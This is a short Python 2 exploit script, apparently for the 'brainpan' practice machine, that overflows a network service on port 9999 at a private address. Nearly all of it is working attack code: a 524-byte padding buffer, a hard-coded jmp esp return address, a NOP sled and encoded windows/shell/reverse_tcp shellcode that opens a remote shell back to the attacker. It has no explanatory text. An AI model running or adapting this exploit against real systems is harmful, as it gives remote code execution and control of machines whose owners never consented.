#! /usr/bin/python
# Name: Rio Atmadja
import socket 
import sys 

# shellcode: windows/shell/reverse_tcp
shellcode = ("\xb8\x2f\x30\xc5\xc0\xdb\xd8\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x49\x83\xc3\x04\x31\x43\x10\x03\x43\x10\xcd\xc5\x39\x28\x98"
"\x26\xc2\xa9\xfa\xaf\x27\x98\x28\xcb\x2c\x89\xfc\x9f\x61\x22"
"\x77\xcd\x91\xb1\xf5\xda\x96\x72\xb3\x3c\x98\x83\x72\x81\x76"
"\x47\x15\x7d\x85\x94\xf5\xbc\x46\xe9\xf4\xf9\xbb\x02\xa4\x52"
"\xb7\xb1\x58\xd6\x85\x09\x59\x38\x82\x32\x21\x3d\x55\xc6\x9b"
"\x3c\x86\x77\x90\x77\x3e\xf3\xfe\xa7\x3f\xd0\x1d\x9b\x76\x5d"
"\xd5\x6f\x89\xb7\x24\x8f\xbb\xf7\xea\xae\x73\xfa\xf3\xf7\xb4"
"\xe5\x86\x03\xc7\x98\x90\xd7\xb5\x46\x15\xca\x1e\x0c\x8d\x2e"
"\x9e\xc1\x4b\xa4\xac\xae\x18\xe2\xb0\x31\xcd\x98\xcd\xba\xf0"
"\x4e\x44\xf8\xd6\x4a\x0c\x5a\x77\xca\xe8\x0d\x88\x0c\x54\xf1"
"\x2c\x46\x77\xe6\x56\x05\x10\xcb\x64\xb6\xe0\x43\xff\xc5\xd2"
"\xcc\xab\x41\x5f\x84\x75\x95\xa0\xbf\xc1\x09\x5f\x40\x31\x03"
"\xa4\x14\x61\x3b\x0d\x15\xea\xbb\xb2\xc0\xbc\xeb\x1c\xbb\x7c"
"\x5c\xdd\x6b\x14\xb6\xd2\x54\x04\xb9\x38\xfd\xae\x43\xab\xc2"
"\x86\x46\x2a\xab\xd4\x56\x3d\x77\x51\xb0\x57\x97\x37\x6a\xc0"
"\x0e\x12\xe0\x71\xce\x89\x8c\xb2\x44\x3d\x70\x7c\xad\x48\x62"
"\xe9\x5d\x07\xd8\xbc\x62\xb2\x77\x41\xf7\x38\xde\x16\x6f\x42"
"\x07\x50\x30\xbd\x62\xea\xf9\x2b\xcd\x85\x05\xbb\xcd\x55\x50"
"\xd1\xcd\x3d\x04\x81\x9d\x58\x4b\x1c\xb2\xf0\xde\x9e\xe3\xa5"
"\x49\xf6\x09\x93\xbe\x59\xf1\xf6\x3e\xa6\x24\x3f\xc5\xde\x42"
"\x53\x05")

#jmp esp found at 0x7e429353
ret = "\x53\x93\x42\x7e"

#note: brainpan crashed after sending 700 bytes to the server
payload = '\x41' * 524 + ret + '\x90' * 16 + shellcode

#send evil payload to the target
print "Sending Evil buffer --> " + str(len(payload)) + " bytes"
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect.connect(("192.168.10.101",9999))

except:

	print "[-] Connection Error"
	response = connect.recv(2000)
	print response
	sys.exit(1)

connect.recv(2000)
connect.send(payload + ' ' + '\r\n')
connect.close()




